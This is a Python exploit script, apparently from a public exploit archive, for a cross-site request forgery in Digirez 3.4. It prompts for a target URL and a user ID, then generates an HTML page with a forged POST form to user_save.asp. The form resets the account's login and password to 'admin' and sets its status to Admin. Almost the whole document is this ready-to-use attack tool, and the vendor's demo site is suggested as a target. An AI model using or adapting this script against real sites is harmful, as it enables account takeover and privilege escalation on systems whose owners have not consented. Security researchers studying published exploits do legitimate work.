#!/usr/local/bin/python
# # # # #
# Exploit Title: Digirez 3.4 - Cross-Site Request Forgery (Update User & Admin)
# Dork: N/A
# Date: 18.09.2017
# Vendor Homepage: http://www.digiappz.com/
# Software Link: http://www.digiappz.com/index.asp
# Demo: http://www.digiappz.com/room/index.asp
# Version: 3.4
# Category: Webapps
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A
# # # # #
# Exploit Author: Ihsan Sencan
# Author Web: http://ihsan.net
# Author Social: @ihsansencan
# # # # #
import os
import urllib

if os.name == 'nt':
		os.system('cls')
else:
	os.system('clear')

def csrfexploit():

	e_baslik = '''
################################################################################
        ______  _______ ___    _   __   _____ _______   ___________    _   __
       /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / /
       / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /
     _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /
    /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/

                                 WWW.IHSAN.NET
                               ihsan[@]ihsan.net
                                       +
                        Digirez 3.4 - CSRF (Update Admin)
################################################################################


	'''
	print e_baslik

	url = str(raw_input(" [+] Enter The Target URL (Please include http:// or https://) \n Demo Site:http://digiappz.com/room: "))
	id = raw_input(" [+] Enter The User ID \n (Demo Site Admin ID:8565): ")

	csrfhtmlcode = '''
<html>
<body>
<form method="POST" action="%s/user_save.asp" name="user" >
<table align=center border=0>
  <tr>
    <td valign="middle">

        <table align=center border=0>
          <tr>
          	<td align=center bgcolor="white">
        	    <table border=0 width=400 cellpadding=2 cellspacing=1>
        			<tr>
        				<td align=left colspan=2 bgcolor="cream">
        					<font color="red">User Update</font>
        				</td>
        			</tr>
                  	<tr>
                    	<td width=150>
        					<font>Choose Login*</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="login" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Choose Password*</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="password" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>First Name*</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="first_name" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Last Name*</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="last_name" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Email*</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="email" size="30"value="admin@admin.com" onBlur="emailvalid(this);">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Address 1</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="address1" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Address 2</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="address2" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>City / Town</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="city" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>ZIP / Postcode</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="postcode" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
                    	<td>
        					<font>State / County</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="county" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
                    	<td>
        					<font>Country</font>
        				</td>
        				<td>
        					<select name="country">
        					     	<option value="1" selected> Turkey
        			     	</select>
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Phone Number
        				<td>
                	    	<INPUT type="text" name="phone" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Fax</font>
        				</td>
        				<td>
                	    	<INPUT type="text" name="fax" size="30"value="admin">
        				</td>
        			</tr>
                  	<tr>
        				<td>
        					<font>Status</font>
        				</td>
        				<td>
							<select name="status">
       								<option value="1"> User</option>
       								<option value="2" selected> Admin</option>
					       </select>
						</td>
        			</tr>
        			<tr>
        				<td colspan=2 align=center>
        					<input type="hidden" name="id" value="%s">
        					<input type="submit" value="Update" onclick="return check()">
        				</td>
        			</tr>
        		 </table>
        	  </td>
        	</tr>
        </table>
	 </td>
  </tr>
</table>
</form>
</body>
</html>
	''' %(url, id)

	print " +----------------------------------------------------+\n [!] The HTML exploit code for exploiting this CSRF has been created."

	print(" [!] Enter your Filename below\n Note: The exploit will be saved as 'filename'.html \n")
	extension = ".html"
	name = raw_input(" Filename: ")
	filename = name+extension
	file = open(filename, "w")

	file.write(csrfhtmlcode)
	file.close()
	print(" [+] Your exploit is saved as %s")%filename
	print("")

csrfexploit()